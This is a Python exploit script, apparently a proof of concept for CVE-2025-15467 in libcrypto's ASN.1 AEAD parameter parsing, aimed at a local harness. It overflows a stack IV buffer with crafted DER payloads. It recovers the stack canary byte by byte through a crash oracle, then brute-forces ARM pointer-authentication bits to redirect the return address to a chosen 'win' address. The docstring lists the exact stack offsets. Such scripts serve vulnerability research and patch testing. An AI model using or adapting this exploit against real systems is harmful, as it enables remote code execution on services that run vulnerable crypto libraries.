#!/usr/bin/env python3
"""1,921-query canary+PAC oracle against the CVE-2025-15467 harness.

Usage: attack.py <port> <win-address> <canary-distance>
Protocol: 4-byte little-endian length + DER payload bytes.
"""
import socket
import struct
import sys
import time

PORT = int(sys.argv[1])
WIN = int(sys.argv[2], 0)
D = int(sys.argv[3])


def base(n):
    """Payload prefix of n bytes.

    D=16 targets the stock libcrypto function's own local iv[]:
      libcrypto evp_cipher_get_asn1_aead_params (0x1d0cf0)
        local iv = sp+8, canary = sp+24, saved x29 = sp+32, LR = sp+40
      so from the copied iv: canary at +16, x29 at +24, LR at +32.
    """
    return b"A" * n


def send_one(payload, timeout=8):
    try:
        s = socket.create_connection(("127.0.0.1", PORT), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(struct.pack("<I", len(payload)) + payload)
        data = b""
        while True:
            b = s.recv(64)
            if not b:
                break
            data += b
            if b"PWNED" in data or b"SURVIVED" in data:
                break
        s.close()
        return data
    except Exception:
        return b""


def batch(payloads, timeout=8):
    socks = []
    for p in payloads:
        try:
            s = socket.create_connection(("127.0.0.1", PORT), timeout=timeout)
            s.settimeout(timeout)
            s.sendall(struct.pack("<I", len(p)) + p)
            socks.append(s)
        except Exception:
            socks.append(None)
    outs = []
    for s in socks:
        if s is None:
            outs.append(b"")
            continue
        data = b""
        try:
            while True:
                b = s.recv(64)
                if not b:
                    break
                data += b
                if b"PWNED" in data or b"SURVIVED" in data:
                    break
        except Exception:
            pass
        s.close()
        outs.append(data)
    return outs


def main():
    canary = bytearray(8)
    queries = 0
    t0 = time.time()

    # canary[0]: glibc low byte is 0x00; verify first, then brute force.
    out = batch([base(D) + b"\x00"])
    queries += 1
    if b"SURVIVED" in out[0] or b"PWNED" in out[0]:
        canary[0] = 0
    else:
        outs = batch([base(D) + bytes([g]) for g in range(256)])
        queries += 256
        hits = [g for g, o in enumerate(outs) if b"SURVIVED" in o or b"PWNED" in o]
        if not hits:
            print("canary[0] not found", flush=True)
            return 1
        canary[0] = hits[0]
    print("canary[0]=0x%02x" % canary[0], flush=True)

    for i in range(1, 8):
        payloads = [base(D) + bytes(canary[:i]) + bytes([g]) for g in range(256)]
        outs = batch(payloads)
        queries += 256
        hits = [g for g, o in enumerate(outs) if b"SURVIVED" in o or b"PWNED" in o]
        if not hits:
            print("canary[%d] not found (t=%.1fs)" % (i, time.time() - t0),
                  flush=True)
            return 1
        canary[i] = hits[0]
        print("canary[%d]=0x%02x t=%.1fs" % (i, canary[i], time.time() - t0),
              flush=True)

    print("canary=%s" % canary.hex(), flush=True)

    payloads = []
    for g in range(128):
        payloads.append(
            base(D) + bytes(canary) + b"C" * 8 +
            struct.pack("<Q", WIN | (g << 48))
        )
    outs = batch(payloads)
    queries += 128
    hits = [g for g, o in enumerate(outs) if b"PWNED" in o]
    print("pac_hits=%s queries=%d elapsed=%.1fs" %
          (hits, queries, time.time() - t0), flush=True)
    return 0 if hits else 1


if __name__ == "__main__":
    sys.exit(main())
